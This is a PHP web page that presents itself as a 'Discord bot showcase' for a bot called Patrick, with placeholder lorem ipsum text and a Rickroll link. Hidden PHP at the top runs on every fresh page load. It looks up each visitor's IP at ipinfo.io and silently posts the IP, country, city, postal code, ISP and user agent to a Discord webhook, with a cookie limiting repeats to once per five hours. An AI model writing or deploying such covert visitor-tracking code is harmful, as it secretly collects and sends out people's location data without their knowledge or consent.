<?php
if (isset($_COOKIE["__checker"])) {} else {
  # Getting IP and related info
  $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "ipinfo.io/{$ip}");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $data = curl_exec($ch);
  $data = json_decode($data, true);
  $agent =  $_SERVER["HTTP_USER_AGENT"];
  # Set IP cookie, so request to discord is only made once (5 hours)
  setcookie("__checker", "set", time() + 18000);

  # Payload to send
  $payload = [
    "embeds" =>
    [[
      "title" => $data["ip"],
      "color" => 439191,
      "fields" => [
        [
          "name" => "Country",
          "value" => $data["country"],
        ],
        [
          "name" => "City",
          "value" => $data["city"],
        ],
        [
          "name" => "Post Code",
          "value" => $data["postal"],
        ],
        [
          "name" => "ISP",
          "value" => $data["org"],
        ],
        [
          "name" => "User Agent",
          "value" => $agent,
        ],
      ],
    ]],
  ];

  # Sending data to discord webhook
  $url = getenv("url");
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
  curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
}  
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!--Site Description-->
  <meta property="og:title" content="Discord bot showcase" />
  <meta property="og:description" content="How I made a fun discord bot under 12 hours" />
  <meta property="og:type" content="website" />
  <meta property="og:image:secure_url" content="./assets/img/patrick-icon.jpg" />
  <meta property="og:image" content="./assets/img/patrick-icon.jpg" />
  <!--  Browser Icon  -->
  <link rel="icon" href="./assets/img/patrick.ico">
  <!--  Bootstrap(s)  -->
  <link rel="" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <!-- My scripts -->
  <link rel="stylesheet" href="./assets/index.css">
  <title>Patrick -- the bot</title>
</head>
<body>
  <!-- Title -->
  <div class="container-fluid" id="intro">
    <h1>Patrick -- The Bot</h1>
    <p>My way of writing a fun discord bot</p>
  </div>
  <!-- Description -->
  <div class="container" id="desc">
    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"><img id="icon-showcase" src="./assets/img/patrick-icon.jpg" alt="psycho"></a>
    <p>
      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
      dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
      commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla
      pariatur.
      Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
    </p>
  </div>
  <br>
  <div class="container">
    <p>
      Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis
      natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque
      eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget,
      arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium.
      Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula,
      porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus.
      Phasellus viverra nulla ut metus varius laoreet. Quisque rutrum. Aenean imperdiet. Etiam ultricies nisi vel augue.
      Curabitur ullamcorper ultricies nisi. Nam eget dui. Etiam rhoncus. Maecenas tempus, tellus eget condimentum rhoncus, sem
      quam semper libero, sit amet adipiscing sem neque sed ipsum. Nam quam nunc, blandit vel, luctus pulvinar, hendrerit id,
      lorem. Maecenas nec odio et ante tincidunt tempus. Donec vitae sapien ut libero venenatis faucibus. Nullam quis ante.
      Etiam sit amet orci eget eros faucibus tincidunt. Duis leo. Sed fringilla mauris sit amet nibh. Donec sodales sagittis
      magna. Sed consequat, leo eget bibendum sodales, augue velit cursus nunc,
    </p>
  </div>
</body>

</html>